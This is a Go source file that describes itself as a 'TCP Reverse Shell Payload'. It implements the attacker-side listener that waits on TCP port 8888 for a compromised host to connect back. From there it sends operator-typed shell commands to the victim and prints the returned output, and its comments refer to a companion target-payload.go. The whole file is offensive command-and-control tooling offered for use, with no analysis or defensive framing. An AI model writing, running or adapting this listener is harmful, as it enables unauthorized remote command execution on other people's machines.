package main

import (
	"fmt"
	"net"
	"io"
	"bufio"
	"os"
	"strings"
)

const (
	//definite values for server
	//just change serverAddress value and if you want, you can change the port value with one of your available tcp port
	//but you will have to change the port value of the port value in target-payload.go
	ip_address = "localhost"
	protocol = "tcp"
	port = "8888"
)


func main() {
	fmt.Println("** TCP Reverse Shell Payload **")
	fmt.Println("**   Developer -> shiva13    **")
	fmt.Println("**          Minerva          **")
	fmt.Println("")
	fmt.Println("")

	listener, listener_error := listener_for_client() //listening for client
	if listener_error != nil {
		fmt.Println(";A listener error occurred; ", listener_error.Error())
	} else {
		fmt.Println(";Listening for the connection;")

		for {
			connection, connection_error := accept_connection_request(listener) //accepting request of the client
			if connection_error != nil {
				fmt.Println(";A request accepting error occurred; ", connection_error.Error())

				continue
			} else {
				//fmt.Println(";The connection has been accepted successfully;")
				//fmt.Println("")

				var cmd_command string
				data_reader := bufio.NewReader(os.Stdin)
				for {
					fmt.Print(">>")
					command, taking_input_error := data_reader.ReadString('\n')
					if taking_input_error == nil {
						cmd_command = strings.Replace(command, "\r\n", "", -1)

						break
					}
				}

				send_command_to_client(connection, cmd_command) //sending a cmd command to the client
				fmt.Println("")
				fmt.Print(">>")

				for {
					//this loop is used to receive whole output until the receiving operation is done
					cmd_output, receiving_error := receive_output_from_client(connection) //receiving the output of the cmd command
					if receiving_error != nil && receiving_error != io.EOF {
						fmt.Println(";A data receiving error has occurred; ", receiving_error.Error())

						break
					} else if receiving_error == io.EOF {
						break
					} else { 
						fmt.Println(cmd_output)
					}
				}
				fmt.Println("")
			}

			connection.Close()
		}
	}
}

func listener_for_client() (listener net.Listener, listener_error error) {
	listener, listener_error = net.Listen(protocol, ip_address + ":" + port)
	
	return
}

func accept_connection_request(listener net.Listener) (connection net.Conn, connection_error error) {
	connection, connection_error = listener.Accept()

	return
} 

func send_command_to_client(connection net.Conn, command string) {
	connection.Write([]byte(command))
}

func receive_output_from_client(connection net.Conn) (output string, receving_error error) {
	buffer := make([]byte, 1024)
	data_length, receving_error := connection.Read(buffer)
	if receving_error != nil {
		output = ""
	} else {
		output = string(buffer[:data_length])
	}

	return
}
